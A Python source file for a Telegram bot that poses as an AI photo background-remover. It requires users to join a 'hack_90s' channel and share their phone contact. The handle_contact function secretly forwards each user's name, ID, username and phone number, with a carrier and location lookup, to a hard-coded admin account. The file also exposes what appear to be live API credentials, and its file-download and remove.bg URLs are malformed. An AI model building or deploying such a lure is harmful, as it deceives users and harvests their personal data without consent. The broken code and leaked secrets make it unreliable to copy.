import telebot
import requests
import os
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from telebot import types
from flask import Flask
from threading import Thread

# --- Render Port Fix (Keep Bot 24/7) ---
app = Flask('')
@app.route('/')
def home(): return "AI Bot is Online!"

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    Thread(target=run).start()

# --- CONFIGURATION ---
API_TOKEN = '8277158758:AAG-HEtgNaAH3QZQOZyUu4AWfZObGsirRmk'
REMOVE_BG_KEY = 'Mx6t5h8VhQ7LnKPBaFq3U4w9'
ADMIN_ID = 8346338271
CHANNEL_LINK = 'https://t.me/hack_90s'
CHANNEL_USERNAME = '@hack_90s' 

bot = telebot.TeleBot(API_TOKEN)
verified_users = {}

# Check Channel Membership
def check_membership(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return False

# Advanced Phone OSINT Tool
def get_osint_info(phone_number):
    try:
        parsed_num = phonenumbers.parse(phone_number, None)
        valid = phonenumbers.is_valid_number(parsed_num)
        country = geocoder.description_for_number(parsed_num, "en")
        service = carrier.name_for_number(parsed_num, "en")
        zones = timezone.time_zones_for_number(parsed_num)
        
        info = (
            f"✅ Status: {'VALID' if valid else 'INVALID'}\n"
            f"🌍 Location:\n• Country: {country}\n• City/State: Service Area\n"
            f"📶 Network:\n• Carrier: {service}\n• Type: Mobile\n• Timezone: {', '.join(zones)}"
        )
        return info
    except: return "❌ OSINT Data Not Available"

@bot.message_handler(commands=['start'])
def start(message):
    if not check_membership(message.from_user.id):
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK),
                   types.InlineKeyboardButton("🔄 Verify Membership", callback_data="check_join"))
        bot.send_message(message.chat.id, "❌ **Access Denied!**\nPlease join our channel to use this AI Bot.", reply_markup=markup, parse_mode='Markdown')
        return
    ask_for_contact(message.chat.id)

def ask_for_contact(chat_id):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("📲 Share Number & Unlock AI", request_contact=True))
    bot.send_message(chat_id, "✅ Welcome! Share your contact to unlock AI features.", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def verify_join(call):
    if check_membership(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        ask_for_contact(call.message.chat.id)
    else:
        bot.answer_callback_query(call.id, "⚠️ Join the channel first!", show_alert=True)

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    user = message.from_user
    phone = message.contact.phone_number
    verified_users[user.id] = True 
    osint_report = get_osint_info(phone)
    
    # OSINT Report for Admin
    admin_log = (
        "🚨 **New Contact Shared!**\n"
        f"👤 Name: {user.first_name}\n🆔 ID: `{user.id}`\n"
        f"🔗 Username: @{user.username or 'None'}\n📱 Phone: `{phone}`\n"
        f"Number: {phone}\n\n{osint_report}\n\n"
        "**OSINT Educational Tool**"
    )
    bot.send_message(ADMIN_ID, admin_log, parse_mode='Markdown')
    bot.send_message(message.chat.id, "✅ **Verified!** Send a photo to remove the background.")

@bot.message_handler(content_types=['photo'])
def process_photo(message):
    if message.from_user.id not in verified_users:
        bot.reply_to(message, "⚠️ Please verify your number first!")
        return
    msg = bot.reply_to(message, "⏳ **AI is removing background...**")
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        file_url = f'https://telegram.org{API_TOKEN}/{file_info.file_path}'
        res = requests.post('https://remove.bg', data={'image_url': file_url, 'size': 'auto'}, headers={'X-API-Key': REMOVE_BG_KEY})
        if res.status_code == 200:
            bot.send_document(message.chat.id, res.content, visible_file_name='Edited.png')
            bot.delete_message(message.chat.id, msg.message_id)
        else: bot.send_message(message.chat.id, "❌ API Key Error.")
    except: bot.send_message(message.chat.id, "❌ Error occurred.")

@bot.message_handler(func=lambda message: True)
def auto_reply(message):
    if message.from_user.id in verified_users:
        bot.reply_to(message, "🤖 AI: I'm ready! Send a photo to remove the background.")

if __name__ == "__main__":
    keep_alive()
    bot.polling(none_stop=True)
    
